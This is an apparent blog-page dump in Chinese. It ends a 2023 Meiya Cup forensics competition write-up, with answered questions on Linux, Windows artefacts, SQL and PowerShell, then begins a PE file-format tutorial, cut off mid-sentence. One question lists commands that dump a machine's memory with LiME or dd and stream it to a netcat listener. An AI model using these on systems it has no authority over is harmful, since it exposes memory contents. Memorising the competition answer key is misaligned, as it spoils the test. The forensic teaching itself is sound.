(2分) A. 包含敏感信息\nB. 无法访问内部系统\nC. 限制暴露的服务\nD. 没有连接到互联网\n堡垒机 (Bastion Host) 是一个位于网络边界（例如公网和私有网络之间）的、经过高度安全加固的服务器，它作为访问内部网络的唯一入口点\n为了最大限度地减少被攻击的风险（即减小攻击面），堡垒机的一个核心安全原则就是尽可能少地开放服务和端口，通常只开放必要的管理服务，如SSH (端口 22) 或RDP (端口 3389)\nC 74. [单选题] 在Linux系统中，哪个命令可以用于创建文件系统？ (1分) A. mount /dev/sda3 /mnt/usb\nB. mkfs-ext4 /dev/sda2\nC. mkfs-ext3 /sys/sda1\nD. pvcreate /dev/sda\nE. genfstab -U -p /mnt\nmkfs是\u0026quot;make filesystem\u0026quot;的缩写，是用于在磁盘分区上创建文件系统的命令\n选项B的mkfs-ext4是专门用于创建ext4文件系统的变体\n选项A的mount命令用于挂载文件系统\n选项C的路径/sys/sda1是错误的，设备文件应在/dev目录下\n选项D的pvcreate用于创建LVM物理卷。选项E的genfstab用于生成/etc/fstab文件内容\nB 75. [单选题] \u0026lsquo;Link’实际上是指向LINUX系统中另一个文件或文件夹的指标。以下哪个命令可以产生以下结果？ (2分) ls -ilas |total 0 |9731253 0 drwxr-xr-x 1 user users 4096 Jul 14 13:31 . |1725961 0 drwxr-xr-x 1 user users 4096 Jul 14 13:29 .. |90371467 0 -rw-r--r-- 2 user users 90 Jul 14 13:30 testing.txt |90371467 0 -rw-r--r-- 2 user users 90 Jul 14 13:30 shotcut-testing.txt A. link -s testing.txt shotcut-testing.txt\nB. ln -s shotcut.txt testing.txt\nC. ln testing.txt shotcut-testing.txt\nD. ln -s testing.txt shotcut-testing.txt\nE. ln shotcut.txt testing.txt\n输出结果中最关键的一列是第一列的inode号，文件testing.txt和shotcut-testing.txt拥有完全相同的inode号(90371467)，并且它们的链接计数为2，这表明它们之间是硬链接(hard link)关系\nln命令在不带-s参数时创建的就是硬链接，命令ln testing.txt shotcut-testing.txt的含义是为源文件testing.txt创建一个名为shotcut-testing.txt的硬链接\nC 76. [单选题] 以下哪个命令用于Linux系统中创建分区？ (1分) A. gdisk /dev/sde\nB. mke2fs /dev/sdb1 -t ext4\nC. mount /dev/sdc1 /mnt/fs_home\nD. fdisk -lu\nE. lvcreate -l +200 /dev/vg00/log/vol-00\n在Linux中，fdisk和gdisk是用于管理磁盘分区的主要工具\n选项A的gdisk /dev/sde会启动一个交互式程序，允许用户在/dev/sde磁盘上创建、删除和修改分区\n选项B的mke2fs用于格式化分区\n选项C的mount用于挂载分区\n选项D的fdisk -lu用于列出分区\n选项E的lvcreate用于创建LVM逻辑卷\nA 77. [单选题] 一个系统管理员要扩展运行在LVM系统中的服务器存储。以下哪个命令可以用于扩展LVM中的逻辑卷？ (1分) A. lvdisplay /dev/vg02/vol-01\nB. lvcreate -n /dev/vg02 -l 200\nC. lvextend -n /dev/vg02 -l +200\nD. lvscan -l +200 /dev/vg02/vol-01\nE. lvresize -l +200 /dev/vg02/vol-01\nlvextend和lvresize命令都可以用来扩展逻辑卷\nlvresize -l +200 /dev/vg02/vol-01命令的含义是在逻辑卷/dev/vg02/vol-01现有大小的基础上增加200个逻辑扩展单元(LE)的容量，而选项C的lvextend语法错误，-n用于指定名称\nE 78. [单选题] 一个系统管理员编写了一个bash代码来构建一个RAID系统，将要实现什么类型的RAID？ (2分) #!/bin/bash hd1=/dev/sda1 hd2=/dev/sdb1 hd3=/dev/sdc1 hd4=/dev/sdd1 mdadm --build /dev/md1 --level=1 --raid-devices=2 $hd1 $hd2 mdadm --build /dev/md2 --level=1 --raid-devices=2 $hd3 $hd4 mdadm --build /dev/md3 --level=0 --raid-devices=2 /dev/md2 /dev/md1 A. RAID 0\nB. RAID 1\nC. RAID 1+0\nD. RAID 0+1\nE. 这个代码不起作用\n脚本首先创建了两个RAID 1阵列（/dev/md1和/dev/md2），然后使用这两个RAID 1阵列作为组件，创建了一个RAID 0阵列(/dev/md3)\nC 79. [单选题] 以下是运行在LINUX服务器中的服务清单。以下哪个命令可以关闭“bluetooth.service”服务？ (3分) |● vm-production-xabonline.com | State: running | Jobs: 0 queued | Failed: 0 units | Since: Fri 2023-05-19 08:37:06 UTC; 2 months 11 days ago | CGroup: | ├─init.scope | │ └─ 1 /sbin/init | ├─system.slice | │ ├─bluetooth.service | │ │ └─ 737 /usr/lib/bluetooth/bluetoothd | │ ├─dbus.service | │ ├─docker.service | │ │ └─ 853 /usr/bin/dockerd -H fd:// | │ ├─libvirtd.service | │ │ └─ 2975 /usr/bin/libvirtd --timeout 120 | │ ├─polkit.service | │ └─virtlogd.service | │ └─ 3176 /usr/bin/virtlogd | └─user.slice | └─user-1000.slice A. systemctl kill bluetooth.service\nB. systemctl disable bluetooth.service\nC. systemctl down bluetooth.service\nD. systemctl stop bluetooth.service\nE. systemctl rm bluetooth.service\n无需多言\nD 80. [单选题] cron服务在LINUX系统中充当作业调度程序。现在准备启动和关闭一个Web服务器（httpd.service），上午8时30分（启动）- 下午6时06分（关闭）；周一至周五，以下哪个crontab设置适用于这种情况？ (1分) A. 30 8 * 1-5 * /usr/bin/systemctl start httpd.service 及 06 18 * 1-5 * /usr/bin/systemctl stop httpd.service\nB. 30 8 * * 1-5 /usr/bin/systemctl start httpd.service 及 06 18 * * 1-5 /usr/bin/systemctl stop httpd.service\nC. 30 8 1-5 * */usr/bin/systemctl start httpd.service 及 06 18 1-5 * */usr/bin/systemctl stop httpd.service\nD. 30 8 * * * /usr/bin/systemctl start httpd.service 及 06 18 * * * /usr/bin/systemctl stop httpd.service\nE. 以上都不是\nCrontab的五个时间字段分别是：\n分钟(0-59)\n小时(0-23)\n日期(1-31)\n月份(1-12)\n星期(0-7，0和7都代表周日)\n\u0026ldquo;周一至周五\u0026quot;用1-5表示\n\u0026ldquo;上午8时30分\u0026quot;是30 8\n\u0026ldquo;下午6时06分\u0026quot;是06 18\nB 81. [单选题] 以下哪个Linux命令可以显示目录中的所有文件，包括隐藏文件？ (1分) A. ls -ls\nB. ls -asl\nC. ls -lAs | wc\nD. ls -als | grep ssh\nE. None\n带-a的就行，D选项grep干坏事了\nB 82. [单选题] 如果您想要检查Linux系统上可用的剩余磁盘空间量，您会使用以下哪个命令？ (1分) A. df -vh\nB. df -sh\nC. dl -vh\nD. dd -sh\nE. dt -vh\nA 83. [单选题] Dockerfile是一个文本文档，用于在Docker架构中生成哪个组件？ (1分) A. docker engine\nB. image\nC. container\nD. volumes\nE. docker network\nB 84. [单选题] 在Linux系统中，哪个不是内存区？ (1分) A. [heap]\nB. [stack]\nC. [paging]\nD. [vvar]\nE. [vdso]\n[heap](堆)、[stack](栈)、[vvar]和[vdso]都是Linux进程内存空间中实际存在的区域\n而Paging(分页)是一种内存管理技术和机制，用于实现虚拟内存\nC 85. [单选题] 以下命令中，哪个命令可以对\u0026quot;export-logs\u0026quot;输出进行排序? (1分) A. export-logs\u0026lt;sort\nB. export-logs\u0026gt;sort\nC. export-logs\u0026amp;sort\nD. export-logs|sort\nE. export-logs\u0026lt;\u0026gt;sort\n管道符使用\nD 86. [多选题] 哪些文件会影响Linux主机的名称解析功能？ (1分) A. /etc/resolv.conf\nB. /etc/hosts\nC. /etc/default/names\nD. /etc/nsswitch.conf\nE. /etc/inet/hosts\nA. 定义DNS服务器的地址\nB. 提供了IP地址到主机名的静态映射，优先级通常高于DNS\nD. 配置文件，定义了系统进行名称解析时查询的顺序（例如，先查files即/etc/hosts，再查dns）\nABD 87. [单选题] 哪个系统文件包含了一般的端口、关联的服务和协议？ (1分) A. /etc/services\nB. /etc/sysconfig/network-scripts\nC. /etc/services.conf\nD. /etc/inet/hosts\nE. Noneofthechoices\nA Win10 88 [填空题] 在 Windows 10 中 \\Users\\qqqqq\\Downloads，视频文件(mixkit-two-women-laying-together-925-medium.mp4)在MFT 中分成多少个Data Cluster 储存？提示: 请以阿拉伯数字作答 (1分) windows默认NTFS格式化时簇大小是4KB，即4096字节\n这个文件大小6.22MB，6525158字节\n6525158 ÷ 4096 ≈ 1593.35，向上取整 → 1594\n1594 89. [单选题] 在 Windows 10 中 \\Users\\qqqqq\\Downloads\\ mixkit-two-woman-laying-together-925-medium.mp4 的last Access 时间是多少? (1分) A. 2023/07/10 18:31:32\nB. 2023/07/10 18:31:01\nC. 2023/07/10 19:31:22\nD. 2023/07/11 19:31:22\nA win7 90. 在 Windows 7 中 \\Users\\Allen\\Desktop，有1个MP3 文件 (例:unlock-me-149058.mp3)，用户使用什么程序打开该MP3 文件? 提示:请以小写字母作答 (1分) 随便点开一个mp3文件：\npotplayer 91. [单选题] 在 Windows 7 中 ’ \\Users\\Allen\\Desktop ‘有1个MP3 文件 (unlock-me-149058.mp3)，该文件的Zone identiflier为’3’。\u0026lsquo;3’代表哪一个security Zone? (1分) A. Local Machine Zone\nB. Internet Zone\nC. Restricted Zone\nD. Trust Site Zone\n在Windows中，Zone Identifier（安全区域标识）用于标记文件来源的安全区域\nZone ID 来源 / 安全区域 (Security Zone) 说明 0 本地计算机（Local Machine） 文件来自本地磁盘 1 本地 Intranet 内部网络资源 2 受信任的站点（Trusted Sites） 浏览器信任列表中的网站 3 Internet 来自互联网下载的文件 4 受限制的站点（Restricted Sites） B 92. [单选题] 在 Windows 7 中 \\Users\\Allen\\Desktop有1个MP3 文件 (unlock-me-149058.mp3)，该文件从哪个网站下载? (1分) A. www.Pixbay.com\nB. free-mp3-download.net/\nC. https://mp3juices.nu\nD. mygomp3.com\n在浏览器历史记录把四个选项全搜了一遍，愣是一个也没有\n看到下载记录，原来是A选项把网站名称打错了：\n虽然没有找到下载题目的记录，但也只能是这个了\nA *正确做法是在缓存里找：\n93. [单选题] 在 Windows 7 中 \\Users\\Allen\\Downloads 内有mp3文件 (miracle.mp3), 更改名称时间? (2分) A. 2023-07-13 02:55:20\nB. 2023-07-15 10:55:20\nC. 2023-07-12 10:58:04\nD. 2023-07-13 10:55:20\n不知道怎么看\n*这个需要解析NTFS看记录\n每一次的NTFS元数据变更，都会记录在$LogFile中，实际上也就是记录MFT的变化\n操作类型 日志内容举例 创建文件 在 $MFT 中新增条目 删除文件 标记 $MFT 记录为删除 移动文件 更新目录索引 ($INDEX_ALLOCATION) 修改属性 更新 $STANDARD_INFORMATION 或 $FILE_NAME 属性 火眼耗时任务里面有这一项，执行之后能直接查看所有的记录，其中就能找到miracle.mp3相关记录：\nA 94. [填空题] 在 Windows 7 中 \\Users\\Allen\\Downloads 内有mp3文件 (miracle.mp3), mp3文件更改名称前的名称是什么? 提示: 请以与记录相同的名称与文件格式作答 (1分) 同上\na-small-miracle-132333.mp3 95. [单选题] 在 Windows 7中有多少个文件曾被potplayer 播放? (1分) A. 7\nB. 8\nC. 9\nD. 10\n不知道\n*可以在Windows 7 x64.vmdk/分区2/Users/Allen/AppData/Roaming/Microsoft/Windows/Recent文件夹下找到最近打开的文件，里面每一个快捷方式就代表一个项目\n桌面上的八个MP4文件在这里面都能找到，当他们都是用potplayer打开的吧\n另外，在最近访问的项目里面还能找到一个从没在recent里面出现过的：\n这个文件也是真实存在的：\n并且时间晚于potplayer的安装时间，按道理说应该也能通过potplayer打开，这么看应该是9个\n可答案是8\n8 96. [填空题] 在 Windows 7中, potplayer最后播放的文件名? 提示: 请以与记录相同的名称(包括小写字母、阿拉伯数字与符号)与文件格式作答 (1分) 不知道\n*这个随便点开一个mp3文件，用potplayer打开，就能在播放清单里面看见（见90题图）\n不过为什么清单里面就是最后一个呢？\n另外，当时在做90题的时候，我点开的就是unlock这个mp3，还以为播放清单是根据我点开的顺序创建的\u0026hellip;\nunlock-me-149058.mp3 脚本 97. [单选题] 事件应急小组正在处理一起网络事件。以下哪一个指令是设定取证服务器以作取得内存内容的初步步骤? (3分) A. nc -l 4444 \u0026gt;mem126.lime.gz\nB. insmod lime.ko “pathtcp:4444 format=lime digest=sha256 compress=1”\nC. scp -I ~/DFIRSciAWTest.pem lime.ko ec2-duckman@3.137.169.127:~/scp -I ~/DFIRSciAWTest.pem /usr/bin/nc ec2-duckman@3.137.169.127:~/\nD. ssh duckman@\u0026lt;target_server_ip\u0026gt; \u0026quot;sudo dd if=/dev/mem | gzip -1 -\u0026quot; \u0026gt; memory_dump.gz\n选项项A使用netcat(nc)命令在取证服务器上监听(listen)4444端口，并将接收到的所有数据流重定向保存到文件mem126.lime.gz中。这是接收内存镜像的标准准备步骤\n选项B是在目标端执行的命令，它加载LiME内核模块以抓取内存，并通过TCP协议将数据发送到指定端口(4444)\n选项C是使用scp将取证工具(lime.ko和nc)上传到目标端，这是一个准备步骤，但不是接收数据的步骤\n选项D是通过ssh在目标端执行dd命令来抓取内存\nA 98. [单选题] 基于两个SQLite数据库文件“cus_202308102034.json”和“date_202308101120.json”，编译一个SQLite脚本找出谁前往目的地“莫斯科\u0026rdquo;。 (3分) A. SELECT c.customer_name, c.destination, datetime(d.arrival_timestamp_HK, 'unixepoch', 'localtime') AS arrival_time_hk FROM cus c INNER JOIN date d ON c.destination = d.Destination WHERE c.destination = 'Moscow'\nB. SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, 'unixepoch', 'localtime') AS arrival_time_hk FROM cus INNER JOIN date ON customer_id = date.id WHERE cus.destination = 'Moscow' AND date.Destination = 'Moscow' AND date.arrival_timestamp_HK IS NOT NULL AND datetime(date.arrival_timestamp_HK, 'unixepoch', 'localtime')\nC. SELECT cus.customer_name, cus.destination, date.arrival_timestampFROM cus INNER JOIN date ON cus.destination = date.destination WHERE cus.destination = 'Moscow' AND date.Destination = 'Moscow'\nD. SELECT cus.customer_name, cus.destination, datetime(date.arrival_timestamp_HK, 'unixepoch', 'localtime') AS arrival_time_hk FROM cus INNER JOIN date ON cus.destination = date.Destination WHERE cus.destination = 'Moscow' AND date.Destination = 'Moscow' AND date.arrival_timestamp_HK IS NOT NULL AND datetime(date.arrival_timestamp_HK, 'unixepoch', 'localtime')\n选项B和D的WHERE子句中包含了AND datetime(...)，这是一个无效的语法，因为它没有进行任何比较\n选项C的WHERE子句cus.destination = date.destination是多余的，因为这已经在JOIN条件中定义了\nA 99. [填空题] 写一个Powershell脚本以提取正在连接到Window 11计算机的可移动设备的记录，提取相关的数据如装置名称、制造商、装置详情、硬件编号，并用“Write-Host”指令显示数据。 (2分) # 获取所有被识别为可移动的即插即用设备 $removableDevices = Get-PnpDevice | Where-Object { $_.Removable -eq $true } # 遍历找到的每个设备并显示其信息 foreach ($device in $removableDevices) { Write-Host \u0026#34;Device Name: $($device.FriendlyName)\u0026#34; Write-Host \u0026#34;Manufacturer: $($device.Manufacturer)\u0026#34; Write-Host \u0026#34;Description: $($device.Description)\u0026#34; # HardwareID可能是一个数组，所以我们用逗号将其连接成一个字符串 $hardwareIds = $device.HardwareID -join \u0026#34;, \u0026#34; Write-Host \u0026#34;Hardware ID(s): $hardwareIds\u0026#34; } 100.[填空题] 编写一个PowerShell脚本从Windows Server 2012 R2获取具有管理员权限的所有使用者活动。使用\u0026quot;Where-Object\u0026quot;命令来进一步过滤事件，如果事件的第9个属性与内建的Administrator账户的安全标识符（SID）匹配，则确保只选择与管理员活动相关的事件。 (3分) # 从安全日志中获取所有成功的登录事件 (Event ID 4624) # 然后通过管道传递给Where-Object进行过滤 Get-WinEvent -FilterHashtable @{LogName=\u0026#39;Security\u0026#39;; ID=4624} | Where-Object { # 检查事件的第9个属性(在数组中索引为8)的值 # 并使用-like操作符匹配内建管理员账户的SID模式(以-500结尾) $_.Properties[8].Value -like \u0026#39;S-1-5-*-500\u0026#39; } ","date":"2025-10-16T12:49:45+08:00","image":"http://picture.928330.xyz/typora/113644svdcd71dd4fdd7sc.jpg","permalink":"https://blog.928330.xyz/p/%E7%BE%8E%E4%BA%9A%E6%9D%AF2023%E4%B8%AA%E4%BA%BA%E8%B5%9B%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"美亚杯2023个人赛取证总结"},{"content":"同样是很重要的文件格式，本篇设计到一些简单逻辑计算，也是挺有意思的\n参考文章：\nPE结构详解 PE文件的类别 PE文件格式是Windows操作系统下使用的标准可执行文件格式，按照系统划分一般有两个称呼：\nPE32：指32位的可执行文件，也有人直接用PE代指 PE32+：64位系统下的可执行文件，是PE32格式的一个扩展，也被叫做PE+ PE格式涵盖了多种文件类型，它们通过不同的扩展名来区分：\n种类 主扩展名 可执行系列 .exe，.scr 库系列 .dll，.ocx，.cpl，.drv 驱动程序系列 .sys，.vxd 对象文件系列 .obj 其中，除了用于链接过程的对象文件（.obj）之外，其他类型的文件都能够被系统加载并执行\nPE32文件的基本结构 DOS头 PE结构的最前端是DOS头，这是一个历史遗留的结构，主要为了兼容古老的MS-DOS系统\ntypedef struct _IMAGE_DOS_HEADER { WORD e_magic; // 魔数，必须是 0x5A4D，即“MZ” WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; // 指向 PE 头的偏移 } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 还是使用一个hello.c生成的exe文件：\n#include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;Hello, World!\u0026#34;); return 0; } 这里用010editor查看exe文件的二进制，它有模版功能，能很好的展示PE文件的结构：\nPE的起始两个字节是固定的签名“MZ”（0x4D5A），是识别一个PE文件的最初步标志\nDOS头最重要的作用是其末尾的四字节的e_lfanew字段，该字段保存了指向NT头的偏移量，也就是PE程序的真正入口\nDOS存根 紧随DOS头之后的是一段可选的DOS存根（DOS Stub）小程序\n这个东西的由来比较好玩，也稍微讲讲\n在上世纪80～90年代初期，个人电脑主要运行MS-DOS系统，那时候的可执行文件格式是MZ格式，由微软工程师Mark Zbikowski设计（他名字的首字母就是MZ）\n后来到了Windows3.x，微软引入了PE格式，但那时的很多电脑还经常在DOS模式下启动，用户如果直接在DOS命令行中里运行一个PE格式的程序就会出现问题：DOS根本不认识PE格式！\n微软不希望让DOS报错或者死机，于是做了这样的设计：在新格式的开头保留了一个旧的MZ头和一小段能在DOS下执行的程序，这就是DOS存根\n如果在纯DOS环境下尝试运行一个现代的Windows程序，这段存根代码会被执行，它通常只会在屏幕上打印一句提示信息“This program cannot be run in DOS mode”，然后正常退出\n而在windows环境下，当windows识别到这是一个PE文件，就会直接跳转到文件偏移e_lfanew处，DOS存根会被完全忽略掉所以可以随便改这一段也不会出错\n这样既保证了兼容性，也避免了错误，还是挺不错的\nNT头 NT头是PE格式的核心头部，包含了关于文件的大量关键信息，它由一个签名和两个重要的子结构组成\ntypedef struct _IMAGE_NT_HEADERS { DWORD Signature; // 签名 \u0026#34;PE\\0\\0\u0026#34; (0x00004550)，四字节 IMAGE_FILE_HEADER FileHeader; // 文件头，20字节 IMAGE_OPTIONAL_HEADER32 OptionalHeader; // 可选头（对于32位），32位下224字节， 64位下240字节 } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 加载器通过签名确认文件是有效的PE文件\n文件头 typedef struct _IMAGE_FILE_HEADER { WORD Machine; // 运行平台（如 x86 = 0x14C，x64 = 0x8664） WORD NumberOfSections; // 节区数量 DWORD TimeDateStamp; // 时间戳（文件编译时间） DWORD PointerToSymbolTable; // 调试符号表指针（现代 PE 通常为 0） DWORD NumberOfSymbols; // 符号数量（通常为 0） WORD SizeOfOptionalHeader; // 可选头大小 WORD Characteristics; // 文件属性标志位 } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 可选头 也有称呼其为扩展头的\ntypedef struct _IMAGE_OPTIONAL_HEADER32 { WORD Magic; // 标识类型：0x10B 表示 PE32，0x20B 表示 PE32+ BYTE MajorLinkerVersion; // 链接器主版本号 BYTE MinorLinkerVersion; // 链接器次版本号 DWORD SizeOfCode; // 代码段总大小 DWORD SizeOfInitializedData; // 已初始化数据段大小 DWORD SizeOfUninitializedData; // 未初始化数据段大小（.bss） DWORD AddressOfEntryPoint; // 程序入口点（RVA） DWORD BaseOfCode; // 代码段起始 RVA DWORD BaseOfData; // 数据段起始 RVA DWORD ImageBase; // 程序首选装载基址 DWORD SectionAlignment; // 节区在内存中的对齐单位 DWORD FileAlignment; // 节区在文件中的对齐单位 WORD MajorOperatingSystemVersion; // 目标操作系统主版本 WORD MinorOperatingSystemVersion; // 次版本 WORD MajorImageVersion; // 程序版本号（主） WORD MinorImageVersion; // 程序版本号（次） WORD MajorSubsystemVersion; // 子系统版本号（主） WORD MinorSubsystemVersion; // 子系统版本号（次） DWORD Win32VersionValue; // 保留（一般为 0） DWORD SizeOfImage; // 映像在内存中的总大小 DWORD SizeOfHeaders; // 所有头部的总大小（对齐后） DWORD CheckSum; // 校验和（系统文件使用） WORD Subsystem; // 子系统类型（GUI、CUI 等） WORD DllCharacteristics; // DLL 特性标志 DWORD SizeOfStackReserve; // 保留的栈空间大小 DWORD SizeOfStackCommit; // 已提交的栈空间大小 DWORD SizeOfHeapReserve; // 保留的堆空间大小 DWORD SizeOfHeapCommit; // 已提交的堆空间大小 DWORD LoaderFlags; // 加载标志（保留） DWORD NumberOfRvaAndSizes; // 数据目录数量（一般为 16） IMAGE_DATA_DIRECTORY DataDirectory[16]; // 数据目录数组（导入表、导出表等） } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; 程序的真正入口点 = ImageBase + AddressOfEntryPoint\n📝 Note 虚拟地址 (Virtual Address, VA)\n程序在内存中执行时使用的绝对地址\n在32位系统中，这是一个0x00000000到0xFFFFFFFF范围内的值\n映像基址 (ImageBase)\nPE映像在内存中的起始虚拟地址\n这是一个非常重要的值，加载器会优先尝试将文件加载到这里\n相对虚拟地址 (Relative Virtual Address, RVA)\n相对于ImageBase的偏移量\n由于在创建PE文件时，无法预知它最终会被加载到内存的哪个确切位置，因此PE文件内部的大部分地址信息都以RVA的形式存在，这样便于后续的重定位\n公式：VA = RVA + ImageBase\n原始偏移 (RAW offset)\n数据在磁盘文件中的位置，相对于文件开头的偏移量，起始值为0，就是我们在十六进制查看器里面看到的地址值\n节表 紧跟在NT头后面的是节表，这是一个数组，它由多个节区头结构IMAGE_SECTION_HEADER结构组成\n文件中有多少个节区，就有多少个节区头，节表就有多少个元素，详细描述着PE体中对应节区的属性\n💡 Tip 和ELF的节类似，PE的节也用于分类各种不同的数据\n不过不同的是，PE的节是直接参与到程序运行中的，而ELF则依靠段运行，节删掉也无所谓\n换言之，PE的节更像是ELF节与段的结合\n除此之外，PE节的名称也有所不同，这里列举一些常见的节：\n名称 作用 .text 可执行代码 .data 已初始化数据 .rdata 只读数据（常量、字符串） .bss 未初始化数据（通常不占文件空间） .rsrc 资源（图标、菜单、对话框） .reloc 重定位表 .idata 导入表（Import Table） .edata 导出表（Export Table） 每个节区头大小固定为40字节\n#define IMAGE_SIZEOF_SHORT_NAME 8 typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 节名称，例如 \u0026#34;.text\u0026#34; \u0026#34;.data\u0026#34; \u0026#34;.rdata\u0026#34; \u0026#34;.rsrc\u0026#34; union { DWORD PhysicalAddress; DWORD VirtualSize; // 节区在内存中的大小（RVA对应） } Misc; DWORD VirtualAddress; // 节在内存中的 RVA（相对于 ImageBase） DWORD SizeOfRawData; // 节在文件中的大小（磁盘对齐后的字节数） DWORD PointerToRawData; // 节在文件中的起始偏移 DWORD PointerToRelocations; // 重定位表指针（如果有重定位信息） DWORD PointerToLinenumbers; // 行号信息指针（调试用） WORD NumberOfRelocations; // 重定位表条目数量 WORD NumberOfLinenumbers; // 行号条目数量 DWORD Characteristics; // 节特性标志（可读、可写、可执行等） } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 可以看到各个节区的大小固定，不足的都使用0填充了：\n有一点需要注意的是，表示PE头（DOS头 + DOS Stub + NT头 + 节表）的大小的字段SizeOfHeaders是根据NT头的文件头的文件在磁盘的对齐字段FileAlignment对齐的，也就是SizeOfHeaders的大小按照FileAlignment向上取整，这种大小称作SizeOfRawData\n另外还有SectionAlignment，这是文件在内存的对齐大小，一般要比FileAlignment大得多，虽然比较稀疏浪费空间，但可以提高CPU访问效率，这种大小称作VirtualSize\n下图我们能看见示例exe里面的具体数据，SizeOfHeaders的确是FileAlignment的整数倍：\n而PE头结束处地址也确实是600h，不足的地方都补0了：\n更好的工具查看 虽然010有模版功能，但终究不是很直观，要找某一个字段还是有些困难\n现在已经有很多PE文件结构查看器，比如PEview，就能很方便查看PE文件结构：\n动态链接 动态链接库（DLL） 什么是DLL DLL是一个独立于主程序文件之外的程序库文件，它包含可被多个应用程序共享使用的代码、数据和资源\n与静态链接将LIB库代码直接嵌入到可执行文件中不同，DLL的代码和数据在程序编译时并不合并，而是在程序运行时才被链接到主程序中，就像ELF的.so共享文件\n特性 静态库（.lib） 动态库（.dll） 链接时机 编译/链接阶段直接嵌入 EXE 程序运行时才加载（动态链接） 共享性 每个EXE拥有独立副本 多个进程可共享同一 DLL的代码段 文件大小 EXE文件增大 EXE文件较小，DLL独立存在 更新 更新库需重新编译 EXE 更新DLL不需重新编译EXE（只要接口未变） 💡 Tip 可以使用软件dnspy对dll进行逆向\nDLL的装载方式 显式链接（Explicit Linking） 程序运行到对应代码的时候时才装载DLL，使用完毕后立即释放内存\n应用程序通过调用Windows API完成对DLL中特定函数的链接：\nHMODULE hDll = LoadLibrary(\u0026#34;example.dll\u0026#34;); // 加载 DLL FARPROC func = GetProcAddress(hDll, \u0026#34;FunctionName\u0026#34;); // 获取函数地址 FreeLibrary(hDll); // 卸载 DLL 如果发现没办法调用目标DLL，程序才会报错\n隐式链接（Implicit Linking） 程序启动时就装载所有需要使用的DLL，程序终止时才释放占用的内存\n在EXE编译时就声明依赖DLL，Windows加载器在进程初始化时扫描EXE的导入表，并加载所有依赖DLL\n如果DLL缺失，程序启动会失败\n导入表 当一个PE文件需要调用其他DLL提供的函数（称为导入函数）时，它就通过导入表来记录这些依赖关系\nPE文件加载时，Windows加载器会读取其导入表，得知它需要哪些DLL，之后加载器会找到并加载这些DLL，然后查询DLL的导出表，找到所需函数的真实内存地址，最后将这个地址填入PE文件的导入地址表中\n导入表目录 不知道你是否还记得，在之前介绍可选头的时候，结构体里面最后有一个数组：\nIMAGE_DATA_DIRECTORY DataDirectory[16]; 其中第2个元素（OptionalHeader.DataDirectory[1]）就是导入表的目录，它也是一个结构体：\ntypedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; // 导入表在文件内存映像中的RVA DWORD Size; // 导入表大小 } IMAGE_DATA_DIRECTORY; 它的作用就是指向导入表的开头\n导入表结构 导入表由IMAGE_IMPORT_DESCRIPTOR数组构成，结构如下：\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; //导入名称表 INT 的 RVA }; DWORD TimeDateStamp; // 通常为 0 DWORD ForwarderChain; // 通常为 -1 或 0 DWORD Name; // DLL 名称的 RVA DWORD FirstThunk; // 导入地址表 IAT 的 RVA } IMAGE_IMPORT_DESCRIPTOR; 导入名称表（INT）与导入地址表（IAT） 导入名称表（Import Name Table，INT）与导入地址表（Import Address Table，IAT）都是IMAGE_THUNK_DATA结构的数组：\ntypedef struct _IMAGE_THUNK_DATA32 { union { DWORD ForwarderString; // 转发字符串的RVA（不常见） DWORD Function; // 实际函数地址（IAT加载后填充） DWORD Ordinal; // 按序号导入时的标志和序号 DWORD AddressOfData; // 指向 IMAGE_IMPORT_BY_NAME 的RVA（INT按名称导入时） } u1; } IMAGE_THUNK_DATA32; 导入名称表INT（OriginalFirstThunk）：\n每个条目指向IMAGE_IMPORT_BY_NAME，包含导入函数的名称或序号：\ntypedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; // 提示值（编译器生成的索引，用于加快查找） BYTE Name[1]; // 函数名称的字符串，以\u0026#39;\\0\u0026#39;结尾 } IMAGE_IMPORT_BY_NAME; 记录函数信息，但未解析真实地址\n与导入地址表IAT（FirstThunk）：\n在加载前，IAT内容和INT 一模一样\n加载时Windows加载器解析DLL中函数实际地址，然后覆盖IAT对应条目\n程序调用函数时，通过IAT中的地址直接跳转\nPE文件加载前：\nPE文件运行时：\n读取INT条目获取函数名，使用DLL模块导出表找到函数实际地址，覆盖IAT对应条目\n示例 我们用PEview\n找到导入表 📝 Note 先区分几个概念以及公式：\n虚拟地址 (Virtual Address, VA)\n程序在内存中执行时使用的绝对地址\n在32位系统中，这是一个0x00000000到0xFFFFFFFF范围内的值\n映像基址 (ImageBase)\nPE映像在内存中的起始虚拟地址\n这是一个非常重要的值，加载器会优先尝试将文件加载到这里\n相对虚拟地址 (Relative Virtual Address, RVA)\n相对于ImageBase的偏移量\n由于在创建PE文件时，无法预知它最终会被加载到内存的哪个确切位置，因此PE文件内部的大部分地址信息都以RVA的形式存在，这样便于后续的重定位\nVA = RVA + ImageBase 原始偏移 (RAW offset)\n数据在磁盘文件中的位置，相对于文件开头的偏移量也就是文件偏移，起始值为0，就是我们在十六进制查看器里面看到的地址值\n这个位置一般通过已知的RAW确定，特别是节的：\n目标RAW = 节在文件中的起始位置 + (目标RVA - 节在内存中的起始虚拟地址) 其中节在内存中的起始虚拟地址就是节的RVA，节在文件中的起始位置就是节的RAW\nRVA - 